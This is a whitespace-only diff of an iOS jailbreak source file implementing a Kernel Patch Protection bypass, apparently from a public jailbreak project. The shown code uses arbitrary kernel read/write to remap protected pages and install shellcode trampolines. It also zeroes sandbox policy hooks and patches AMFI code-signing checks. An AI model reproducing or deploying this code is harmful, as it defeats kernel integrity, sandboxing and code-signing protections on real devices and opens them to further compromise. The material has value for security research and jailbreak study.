@@ -6,23 +6,23 @@
 //  Copyright © 2017 xerub. All rights reserved.
 //  Copyright © 2017 qwertyoruiop. All rights reserved.
 //
-
+    
 #include "kpp.h"
 #include "kernel.h"
-
+    
 // @qwertyoruiop's KPP bypass
-
+    
 #import "pte_stuff.h"
 #include "patchfinder64.h"
-
-
+    
+    
 kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, task_t tfp0, uint64_t credpatch) {
     kern_return_t ret;
-    
+        
     checkvad();
-    
+        
     uint64_t entryp;
-    
+        
     int rv = init_patchfinder(tfp0, kernbase, NULL);
     if (rv != 0) {
         printf("[ERROR]: could not initialize kernel\n");
@@ -30,10 +30,10 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
         goto cleanup;
     }
     printf("[INFO]: sucessfully initialized kernel\n");
-    
+        
     uint64_t gStoreBase = find_gPhysBase();
     printf("[INFO]: gStoreBase = %llx \n", gStoreBase);
-
+        
     gPhysBase = ReadAnywhere64(gStoreBase);
     gVirtBase = ReadAnywhere64(gStoreBase+8);
     printf("[INFO]: gPhysBase = %llx \n", gPhysBase);
@@ -43,15 +43,15 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
     printf("[INFO]: entryp = %llx \n", entryp);
     
     uint64_t rvbar = entryp & (~0xFFF);
-    
+        
     uint64_t cpul = find_register_value(rvbar+0x40, 1);
-    
+        
     uint64_t optr = find_register_value(rvbar+0x50, 20);
     if (uref) {
         optr = ReadAnywhere64(optr) - gPhysBase + gVirtBase;
     }
     printf("[INFO]: optr = %llx \n", optr);
-    
+        
     uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
     uint64_t cpu = ReadAnywhere64(cpu_list);
     
@@ -62,7 +62,7 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
     printf("[INFO]: level1_table = %llx \n", level1_table);
     
     uint64_t shellcode = physalloc(0x4000);
-
+        
     /*
      ldr x30, a
      ldr x0, b
@@ -302,7 +302,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     uint64_t shtramp = kernbase + ((const struct mach_header *)find_mh())->sizeofcmds + sizeof(struct mach_header_64);
     RemapPage(cpacr_addr);
     WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
-
+            
     RemapPage(shtramp);
     WriteAnywhere32(NewPointer(shtramp), 0x58000041);
     WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
@@ -315,15 +315,15 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     uint64_t kernvers = find_str("Darwin Kernel Version");
     uint64_t release = find_str("RELEASE_ARM");
-
+        
     RemapPage(kernvers-4);
     WriteAnywhere32(NewPointer(kernvers-4), 1);
-
+        
     RemapPage(release);
     if (NewPointer(release) == (NewPointer(release+11) - 11)) {
         copyout(NewPointer(release), "MarijuanARM", 11); /* marijuanarm */
     }
-    
+        
     /* nonceenabler ? */
     {
         uint64_t sysbootnonce = find_sysbootnonce();
@@ -333,7 +333,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
 
     /* AMFI */
-    
+        
     uint64_t memcmp_got = find_amfi_memcmpstub();
     uint64_t ret1 = find_ret_0();
 
@@ -342,14 +342,14 @@ remappage[remapcnt++] = (x & (~PMK));\
 
     uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
     printf("[INFO]: fref at %llx\n", fref);
-
+        
     uint64_t amfiops = find_amfiops();
     printf("[INFO]: amfistr at %llx\n", amfiops);
     
     {
         uint64_t sbops = amfiops;
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-        
+            
         uint64_t nopag = sbops_end - sbops;
         
         for (int i = 0; i < nopag; i+= PSZ)
@@ -372,9 +372,9 @@ remappage[remapcnt++] = (x & (~PMK));\
             break;
         }
         fref += 4;
-    }
+    }   
 
-    fref += 4;
+     fref += 4;
 
     /*
      second str
@@ -391,7 +391,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
         fref += 4;
     }
-    
+        
     {
         /*
          sandbox
@@ -404,7 +404,7 @@ remappage[remapcnt++] = (x & (~PMK));\
 
         for (int i = 0; i < nopag; i++) {
             RemapPage(((sbops + i*(PSZ)) & (~PMK)));
-        }
+            }
 
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
@@ -450,20 +450,20 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere32(remap + 4, 0xd61f0020);
         WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
 
-    }
-
+    }   
+    
     for (int i = 0; i < z; i++) {
         WriteAnywhere64(plist[i], physcode + 0x100);
     }
 
     while (ReadAnywhere32(kernvers-4) != 1) {
         sleep(1);
-    }
+    }   
 
     printf("[INFO]: enabled patches\n");
-    
+        
     ret = KERN_SUCCESS;
-
+    
 cleanup:
     return ret;
-}
+}   
